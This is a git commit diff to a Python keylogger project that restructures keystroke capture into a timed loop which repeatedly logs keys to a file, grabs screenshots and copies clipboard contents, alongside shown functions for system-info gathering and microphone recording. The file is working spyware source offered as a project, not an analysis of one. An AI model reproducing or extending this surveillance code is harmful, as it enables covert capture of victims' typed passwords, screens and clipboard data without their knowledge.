960671fcd36d72123f44c57344044ed24f8d5d7f
Gnyan Sai <asapannagnyansai1167@gmail.com>
2025-06-23 18:42:04 +0530

    The keylogger has been updated to a keylogger with a timer.

--- project/keylogger.py
+++ project/keylogger.py
@@ -37,42 +37,10 @@ clipboard_info = "clipboard.txt"
 audio_info = "audio_recording.wav"
 screenshot_info = "screenshot.png"
 microphone_time = 15
-
+time_iteration = 20
+number_of_iterations_end = 5
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
-
-count = 0
-keys = []
-
-def on_press(key):
-    global keys, count
-    
-    print(key)
-    keys.append(key)
-    count += 1
-    
-    if count>= 1:
-        count = 0
-        write_file(keys)
-        keys = []
-        
-def  write_file(keys):
-    with open(file_path + extend + keys_info, "a") as k:
-        for key in keys:
-            c = str(key).replace("'", "")
-            if c.find ("space") > 0:
-                k.write('\n')
-                k.close()
-            elif c.find("Key") == -1:
-                k.write(c)
-                k.close()
-                
-def on_release(key):
-    if key == Key.esc:
-        return False
-    
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
 
 def get_system_info():
     with open(file_path + extend + "sys_info.txt", "a") as f:
@@ -104,8 +72,6 @@ def copy_clipboard():
         except Exception as e:
             f.write("Could not read clipboard: " + str(e))
         
-copy_clipboard()
-
 def record_audio():
     fs = 44100  
     seconds = microphone_time 
@@ -125,4 +91,58 @@ def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_info)
 
-screenshot()
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+
+while number_of_iterations < number_of_iterations_end:
+
+    count = 0
+    keys =[]
+
+    def on_press(key):
+        global keys, count, currentTime
+
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys =[]
+
+    def write_file(keys):
+        with open(file_path + extend + keys_info, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if currentTime > stoppingTime:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > stoppingTime:
+
+        with open(file_path + extend + keys_info, "w") as f:
+            f.write(" ")
+
+        screenshot()
+
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
